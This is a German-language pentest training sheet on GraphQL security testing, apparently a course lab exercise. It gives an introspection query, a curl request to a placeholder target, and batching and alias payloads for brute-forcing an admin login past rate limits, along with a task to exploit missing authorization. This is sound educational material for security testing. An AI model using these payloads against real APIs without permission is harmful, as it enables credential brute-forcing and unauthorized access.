GraphQL Security Testing

Cheat Sheets
Web Burp Suite
Lernziele
  • GraphQL-Introspection für Schema-Enumeration nutzen
  • Fehlende Autorisierung in Queries und Mutations ausnutzen
  • Batching-Angriffe für Rate-Limit-Bypass durchführen
  • IDOR über GraphQL-IDs ausnutzen
Hintergrund

GraphQL ist eine Alternative zu REST-APIs. Sicherheitsprobleme entstehen häufig durch aktivierte Introspection in Produktion (Schema-Leak), fehlende Autorisierungsprüfungen auf Feld-Ebene und unzureichendes Rate-Limiting.

Introspection ermöglicht es, das komplette Schema abzufragen — alle Typen, Felder, Mutations. Das ist der erste Schritt bei jedem GraphQL-Pentest. Tools wie GraphQL Voyager visualisieren das Schema als Graph.

Schlüsselkonzepte

Introspection Query

Code anzeigen
{
  __schema {
    types {
      name
      fields {
        name
        type { name }
      }
    }
  }
}

# Mit curl
curl -s -X POST https://target/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name}}}"}' | jq

Batching-Angriff (Rate Limit Bypass)

Code anzeigen
# Viele Queries in einem Request
[
  {"query": "{ user(id:1) { email } }"},
  {"query": "{ user(id:2) { email } }"},
  ...
]

# Aliases für Brute Force in einem Request
{
  attempt1: login(user:"admin", pass:"pass1") { token }
  attempt2: login(user:"admin", pass:"pass2") { token }
}

Batching sendet viele Queries als JSON-Array — Rate-Limiting zählt oft nur Requests.

Aufgabe

Teste eine GraphQL-API: führe Introspection durch, mappe alle Mutations und Queries, identifiziere fehlende Autorisierung und führe einen Batching-Angriff zur Umgehung von Rate-Limiting durch.

Anforderungen
  1. Introspection: vollständiges Schema extrahieren
  2. GraphQL Voyager: Schema visualisieren
  3. Admin-Mutation ohne Autorisierung aufrufen
  4. Batching-Angriff mit 50 gleichzeitigen Requests
Akzeptanzkriterien
  • Schema vollständig gemappt
  • Fehlende Autorisierung ausgenutzt
  • Batching-Angriff erfolgreich
